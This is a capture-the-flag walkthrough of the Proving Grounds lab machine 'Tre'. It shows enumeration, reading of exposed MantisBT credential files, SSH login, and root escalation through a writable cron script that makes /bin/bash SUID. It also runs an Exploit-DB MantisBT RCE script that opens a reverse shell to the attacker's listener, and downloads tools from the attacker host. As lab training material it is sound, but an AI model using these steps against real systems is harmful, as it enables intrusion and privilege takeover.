
# Recon

```console
root@kali:/OSCPv3/offsec_pg/Tre# nmap -Pn -sT -sV -n 192.168.234.84  -p- --min-rate 1000 --max-retries 2
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-08 23:31 CST
Warning: 192.168.234.84 giving up on port because retransmission cap hit (2).
Nmap scan report for 192.168.234.84
Host is up (0.10s latency).
Not shown: 63713 closed ports, 1819 filtered ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.38 ((Debian))
8082/tcp open  http    nginx 1.14.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.65 seconds
```

## HTTP TCP/80

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/1.png)

```console
oot@kali:/OSCPv3/offsec_pg/Tre# nmap -Pn -sT -sV -n 192.168.234.84 -p 80 --script http-enum 
Starting Nmap 7.70 ( https://nmap.org ) at 2021-12-08 23:35 CST
Nmap scan report for 192.168.234.84
Host is up (0.099s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
| http-enum: 
|   /system/admin/: Possible admin folder (401 Unauthorized)
|   /info.php: Possible information file
|   /system/admin/header.php: Habari Blog (401 Unauthorized)
|   /system/admin/comments_items.php: Habari Blog (401 Unauthorized)
|_  /system/: Potentially interesting folder (401 Unauthorized)
|_http-server-header: Apache/2.4.38 (Debian)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.13 seconds
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/2.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/3.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/4.png)


```console
root@kali:/OSCPv3/offsec_pg/Tre# python3 /opt/dirsearch/dirsearch.py -u http://192.168.234.84/ -e php,txt,xml -x 403

 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: php, txt, xml | HTTP method: get | Threads: 10 | Wordlist size: 6823

Error Log: /opt/dirsearch/logs/errors-21-12-08_23-47-36.log

Target: http://192.168.234.84/

[23:47:37] Starting: 
[23:47:58] 200 -    5KB - /adminer.php
[23:48:09] 301 -  314B  - /cms  ->  http://192.168.234.84/cms/
[23:48:09] 302 -    0B  - /cms/  ->  site/
[23:48:22] 200 -  164B  - /index.html
[23:48:23] 200 -   87KB - /info.php
[23:48:46] 401 -  461B  - /system
[23:48:46] 401 -  461B  - /system/
[23:48:46] 401 -  461B  - /system/cron/cron.txt
[23:48:46] 401 -  461B  - /system/error.txt
[23:48:46] 401 -  461B  - /system/log/
[23:48:46] 401 -  461B  - /system/logs/

Task Completed
``` 


```console
root@kali:/OSCPv3/offsec_pg/Tre# wfuzz -c -t 500 --hc=400,404,403 --basic admin:admin -w /opt/dirsearch/db/dicc.txt http://192.168.234.84/system/FUZZ

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.2.11 - The Web Fuzzer                        *
********************************************************

Target: http://192.168.234.84/system/FUZZ
Total requests: 6124

==================================================================
ID	Response   Lines      Word         Chars          Payload    
==================================================================

002824:  C=301      9 L	      28 W	    321 Ch	  "doc"
003423:  C=301      9 L	      28 W	    324 Ch	  "images"
003512:  C=302      0 L	       0 W	      0 Ch	  "index.php/login/"
003655:  C=301      9 L	      28 W	    320 Ch	  "js"
003706:  C=301      9 L	      28 W	    322 Ch	  "lang"
003747:  C=301      9 L	      28 W	    325 Ch	  "library"
003145:  C=301      9 L	      28 W	    323 Ch	  "fonts"
003853:  C=302      0 L	       0 W	      0 Ch	  "login.php"
000944:  C=301      9 L	      28 W	    323 Ch	  "admin"
002644:  C=301      9 L	      28 W	    321 Ch	  "css"
002455:  C=200    307 L	     568 W	  10629 Ch	  "composer.lock"
002454:  C=200     16 L	      30 W	    368 Ch	  "composer.json"
004885:  C=200    109 L	     621 W	   4714 Ch	  "readme.md"
005000:  C=200     20 L	     100 W	   1808 Ch	  "scripts/"
004998:  C=301      9 L	      28 W	    325 Ch	  "scripts"
003507:  C=302      0 L	       0 W	      0 Ch	  "index.php"
002471:  C=301      9 L	      28 W	    324 Ch	  "config"
002511:  C=200     20 L	     101 W	   1782 Ch	  "config/"
005879:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_real.php"
005875:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_classmap.php"
005876:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_files.php"
005880:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_static.php"
005883:  C=200     21 L	     169 W	   1075 Ch	  "vendor/composer/LICENSE"
005881:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/ClassLoader.php"
005882:  C=200    303 L	     551 W	   9376 Ch	  "vendor/composer/installed.json"
005878:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_psr4.php"
005877:  C=200      0 L	       0 W	      0 Ch	  "vendor/composer/autoload_namespaces.php"
005874:  C=200      0 L	       0 W	      0 Ch	  "vendor/autoload.php"
005897:  C=200     52 L	     337 W	   4900 Ch	  "view.php"
002596:  C=301      9 L	      28 W	    322 Ch	  "core"
001835:  C=301      9 L	      28 W	    321 Ch	  "api"
001839:  C=200     17 L	      71 W	   1138 Ch	  "api/"
001109:  C=302      0 L	       0 W	      0 Ch	  "admin/index.php"
001024:  C=302      0 L	       0 W	      0 Ch	  "admin/"
001027:  C=302      0 L	       0 W	      0 Ch	  "admin/?/login"
004718:  C=301      9 L	      28 W	    325 Ch	  "plugins"
002825:  C=200     23 L	     128 W	   2423 Ch	  "doc/"

Total time: 34.46343
Processed Requests: 6124
Filtered Requests: 6087
Requests/sec.: 177.6955
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/5.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/6.png)

# Explotation

```console
root@kali:/OSCPv3/offsec_pg/Tre# curl --user admin:admin http://192.168.196.84/system/config/config_inc.php.sample  | grep g_d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3354  100  3354    0     0  14519      0 --:--:-- --:--:-- --:--:-- 14582
# from config_defaults_inc.php by uncommenting the config option
# Look in http://www.mantisbt.org/docs/ or config_defaults_inc.php for more
$g_db_username   = 'mantisdbuser';
$g_db_password   = '';
$g_database_name = 'bugtracker';
$g_db_type       = 'mysqli';
# $g_disallowed_files		= '';		# extensions comma separated
# $g_default_home_page = 'my_view_page.php';	# Set to name of page to go to after login
``` 


```console
root@kali:/OSCPv3/offsec_pg/Tre# curl --user admin:admin http://192.168.196.84/system/config/a.txt  | grep g_d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3411  100  3411    0     0  12540      0 --:--:-- --:--:-- --:--:-- 12540
# from config_defaults_inc.php by uncommenting the config option
# Look in http://www.mantisbt.org/docs/ or config_defaults_inc.php for more
$g_db_username   = 'mantissuser';
$g_db_password   = 'password@123AS';
$g_database_name = 'mantis';
$g_db_type       = 'mysqli';
# $g_disallowed_files		= '';		# extensions comma separated
# $g_default_home_page = 'my_view_page.php';	# Set to name of page to go to after login
``` 

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/7.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/8.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/9.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/10.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/11.png)


```shell
administrator:XiBejMub
tre:Tr3@123456A!

64c4685f8da5c2225de7890c1bad0d7f
```

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/12.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/13.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/14.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/15.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/16.png)

![Web](https://github.com/jenriquezv/offsec_pg/blob/main/Tre/img/17.png)


```console
root@kali:/OSCPv3/offsec_pg/Tre# ssh tre@192.168.196.84
The authenticity of host '192.168.196.84 (192.168.196.84)' can't be established.
ECDSA key fingerprint is SHA256:wNJwlp5ha0nS3Mr1x6DPLtzNMMr/2egeef6B6N2hfsU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.196.84' (ECDSA) to the list of known hosts.
tre@192.168.196.84's password: 
Permission denied, please try again.
tre@192.168.196.84's password: 
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
tre@tre:~$ whoami
tre
tre@tre:~$ 
```

```console
tre@tre:~$ ls -la
total 24
drwxr-xr-x 2 tre  tre  4096 Aug 23  2020 .
drwxr-xr-x 3 root root 4096 May 11  2020 ..
-rw-r--r-- 1 tre  tre   220 May 11  2020 .bash_logout
-rw-r--r-- 1 tre  tre  3526 May 11  2020 .bashrc
-rw-r--r-- 1 tre  tre   807 May 11  2020 .profile
-rw-r--r-- 1 tre  tre    33 Dec 10 01:02 local.txt
tre@tre:~$ cat local.txt 
28bb1499b6f628347aaeab40e0f5271b
``` 

# Privilege escalation

```console
tre@tre:~$ whoami
tre
tre@tre:~$ sudo -l
Matching Defaults entries for tre on tre:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User tre may run the following commands on tre:
    (ALL) NOPASSWD: /sbin/shutdown
``` 

```console
tre@tre:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
tre:x:1000:1000:tre,,,:/home/tre:/bin/bash
tre@tre:~$ 

tre@tre:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/su
/usr/bin/sudo
/usr/bin/fusermount
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/mount
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

```console
tre@tre:/var/www/html/mantisbt$ ls -la /usr/share/nginx/html/
total 236
drwxr-xr-x 2 root root   4096 May 12  2020 .
drwxr-xr-x 4 root root   4096 May 12  2020 ..
-rw-r--r-- 1 root root 227984 May 12  2020 file.jpg
-rw-r--r-- 1 root root    164 May 12  2020 index.html
```

```console
tre@tre:/tmp$ wget http://192.168.49.196:8000/pspy64s
--2021-12-10 02:22:04--  http://192.168.49.196:8000/pspy64s
Connecting to 192.168.49.196:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1156536 (1.1M) [application/octet-stream]
Saving to: 'pspy64s'

pspy64s                             100%[===================================================================>]   1.10M   815KB/s    in 1.4s    

2021-12-10 02:22:06 (815 KB/s) - 'pspy64s' saved [1156536/1156536]

tre@tre:/tmp$ 

tre@tre:/tmp$ chmod +x pspy64s 
```

```console
tre@tre:/tmp$ ./pspy64s 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scannning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...

...
...

2021/12/10 02:23:57 CMD: UID=0    PID=26713  | /bin/bash /usr/bin/check-system 
2021/12/10 02:23:58 CMD: UID=0    PID=26714  | /bin/bash /usr/bin/check-system 
2021/12/10 02:23:59 CMD: UID=0    PID=26715  | /bin/bash /usr/bin/check-system 

...
...

```

```console
tre@tre:/tmp$ ls -la /bin/bash /usr/bin/check-system
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-rw----rw- 1 root root     135 May 12  2020 /usr/bin/check-system
tre@tre:/tmp$ file /usr/bin/check-system
/usr/bin/check-system: ASCII text
tre@tre:/tmp$ ls -la /bin/bash /usr/bin/check-system
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-rw----rw- 1 root root     135 May 12  2020 /usr/bin/check-system
```

```console
tre@tre:/tmp$ cat /usr/bin/check-system
#!/bin/bash

id > /tmp/id
chmod u+s /bin/bash
tre@tre:/tmp$ sudo /sbin/shutdown 
Shutdown scheduled for Fri 2021-12-10 03:03:11 EST, use 'shutdown -c' to cancel.
tre@tre:/tmp$ sudo /sbin/shutdown -r now
tre@tre:/tmp$ Connection to 192.168.196.84 closed by remote host.
Connection to 192.168.196.84 closed.
``` 

```console
root@kali:/OSCPv3/offsec_pg/Tre# ssh tre@192.168.224.84
tre@192.168.224.84's password: 
Linux tre 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2 (2020-04-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Dec 10 03:33:56 2021 from 192.168.49.224
-bash-5.0$ whoami
tre
-bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
-bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=1000(tre) gid=1000(tre) euid=0(root) groups=1000(tre),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
bash-5.0# cat /root/proof.txt 
daf949b1440db05b30b2cc151b329a43
``` 

```console
root@kali:/OSCPv3/offsec_pg/Tre# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.196] from (UNKNOWN) [192.168.196.84] 50532
bash: cannot set terminal process group (511): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.0$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
bash-5.0$ ^Z
[1]+  Detenido                nc -lvnp 4444
root@kali:/OSCPv3/offsec_pg/Tre# stty raw -echo
root@kali:/OSCPv3/offsec_pg/Tre# nc -lvnp 4444
                                              reset
reset: unknown terminal type unknown
Terminal type? xterm


bash-5.0$ export TERM=xterm-256color
bash-5.0$ export SHELL=bash
``` 


```console
bash-5.0# cat /usr/bin/check-system
#!/bin/bash

id > /tmp/id
chmod u+s /bin/bash
bash-5.0# 
bash-5.0$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
bash-5.0$ bash -p
bash-5.0# whoami
root
bash-5.0# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-5.0# cat /root/proof.txt 
e53f7e6c2040585284b7511500ea4aaf
``` 
# Explotation 2

```console
root@kali:/OSCPv3/offsec_pg/Tre# searchsploit Mantis
-------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                |  Path
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Mantis Bug Tracker 0.15.x/0.16/0.17.x - JPGraph Remote File Inclusion Command Execution                       | php/webapps/21727.txt
Mantis Bug Tracker 0.19 - Remote Server-Side Script Execution                                                 | php/webapps/24390.txt
Mantis Bug Tracker 0.19.2/1.0 - 'Bug_sponsorship_list_view_inc.php' File Inclusion                            | php/webapps/26423.txt
Mantis Bug Tracker 0.x - Multiple Cross-Site Scripting Vulnerabilities                                        | php/webapps/24391.txt
Mantis Bug Tracker 0.x - New Account Signup Mass Emailing                                                     | php/webapps/24392.php
Mantis Bug Tracker 0.x/1.0 - 'manage_user_page.php?sort' Cross-Site Scripting                                 | php/webapps/27229.txt
Mantis Bug Tracker 0.x/1.0 - 'view_all_set.php' Multiple Cross-Site Scripting Vulnerabilities                 | php/webapps/27228.txt
Mantis Bug Tracker 0.x/1.0 - 'View_filters_page.php' Cross-Site Scripting                                     | php/webapps/26798.txt
Mantis Bug Tracker 0.x/1.0 - Multiple Input Validation Vulnerabilities                                        | php/webapps/26172.txt
Mantis Bug Tracker 1.1.1 - Code Execution / Cross-Site Scripting / Cross-Site Request Forgery                 | php/webapps/5657.txt
Mantis Bug Tracker 1.1.3 - 'manage_proj_page' PHP Code Execution (Metasploit)                                 | php/remote/44611.rb
Mantis Bug Tracker 1.1.3 - Remote Code Execution                                                              | php/webapps/6768.txt
Mantis Bug Tracker 1.1.8 - Cross-Site Scripting / SQL Injection                                               | php/webapps/36068.txt
Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (1)              | multiple/webapps/41685.rb
Mantis Bug Tracker 1.2.0a3 < 1.2.17 XmlImportExport Plugin - PHP Code Injection (Metasploit) (2)              | php/remote/35283.rb
Mantis Bug Tracker 1.2.19 - Host Header                                                                       | php/webapps/38068.txt
Mantis Bug Tracker 1.2.3 - 'db_type' Cross-Site Scripting / Full Path Disclosure                              | php/webapps/15735.txt
Mantis Bug Tracker 1.2.3 - 'db_type' Local File Inclusion                                                     | php/webapps/15736.txt
Mantis Bug Tracker 1.3.0/2.3.0 - Password Reset                                                               | php/webapps/41890.txt
Mantis Bug Tracker 1.3.10/2.3.0 - Cross-Site Request Forgery                                                  | php/webapps/42043.txt
Mantis Bug Tracker 2.24.3 - 'access' SQL Injection                                                            | php/webapps/49340.py
Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)                                            | php/webapps/48818.py
-------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results


root@kali:/OSCPv3/offsec_pg/Tre# searchsploit -m 48818
  Exploit: Mantis Bug Tracker 2.3.0 - Remote Code Execution (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/48818
     Path: /usr/share/exploitdb/exploits/php/webapps/48818.py
File Type: Python script, ASCII text executable

Copied to: /OSCPv3/offsec_pg/Tre/48818.py

``` 


```console
root@kali:/OSCPv3/offsec_pg/Tre# nano 48818.py
...
...
class exploit():
	def __init__(self):
		self.s = requests.Session()
		self.s.auth = ('admin', 'admin')
		self.headers = dict() # Initialize the headers dictionary
		self.RHOST = "192.168.196.84" # Victim IP
		self.RPORT = "80" # Victim port
		self.LHOST = "192.168.49.196" # Attacker IP
		self.LPORT = "4444" # Attacker Port
		self.verify_user_id = "1" # User id for the target account
		self.realname = "administrator" # Username to hijack
		self.passwd = "password" # New password after account hijack
		self.mantisLoc = "/system" # Location of mantis in URL
...
...
```

```console
root@kali:/OSCPv3/offsec_pg/Tre# python 48818.py 
Successfully hijacked account!
Successfully logged in!
Triggering reverse shell
Cleaning up
Deleting the dot_tool config.
Traceback (most recent call last):
  File "48818.py", line 182, in <module>
    exploit.Cleanup()
  File "48818.py", line 160, in Cleanup
    data = "adm_config_delete_token=" + cleanup_dict['adm_config_delete_token'] + "&user_id=" + cleanup_dict['user_id'] + "&project_id=" + cleanup_dict['project_id'] + "&config_option=" + cleanup_dict['config_option'] + "&_confirmed=1"
KeyError: 'adm_config_delete_token'
``` 


```console
root@kali:/OSCPv3/offsec_pg/Tre# nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.49.196] from (UNKNOWN) [192.168.196.84] 37846
bash: cannot set terminal process group (574): Inappropriate ioctl for device
bash: no job control in this shell
www-data@tre:/var/www/html/system$ whoami
whoami
www-data
``` 







